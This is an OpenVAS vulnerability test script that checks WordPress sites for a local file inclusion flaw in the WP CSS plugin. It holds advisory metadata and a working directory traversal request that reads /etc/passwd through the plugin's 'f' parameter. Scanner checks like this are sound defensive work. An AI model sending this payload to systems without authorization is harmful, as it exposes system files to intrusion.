###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_wordpress_wp_css_lfi_vuln.nasl 7019 2017-08-29 11:51:27Z teissa $
#
# WordPress 'WP CSS' Plugin Local File Inclusion Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation could allow attackers to perform directory
traversal attacks and read arbitrary files on the affected application.

Impact Level: Application";

tag_affected = "WordPress WP CSS plugin version 2.0.5";

tag_insight = "The flaw is due to input validation error in 'f' parameter
to 'wp-content/plugins/wp-css/wp-css-compress.php', which allows attackers
to read arbitrary files via a ../(dot dot) sequences.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running with WordPress WP CSS Plugin and is prone to
local file inclusion vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.902723";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_id(902723);
  script_version("$Revision: 7019 $");
  script_tag(name:"last_modification", value:"$Date: 2017-08-29 13:51:27 +0200 (Tue, 29 Aug 2017) $");
  script_tag(name:"creation_date", value:"2011-08-26 14:59:42 +0200 (Fri, 26 Aug 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("WordPress 'WP CSS' Plugin Local File Inclusion Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/45734");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/104467/wpyoast-disclose.txt");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("wordpress/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");


## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get WordPress Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

## Construct attack
url = string(dir, "/wp-content/plugins/wp-css/wp-css-compress.php?f=",
             crap(data:"..%2f",length:3*15), "etc/passwd");

## Confirm exploit worked properly or not
if(http_vuln_check(port:port, url:url,pattern:"(root:.*:0:[01]:*)")){
  security_message(port:port);
}
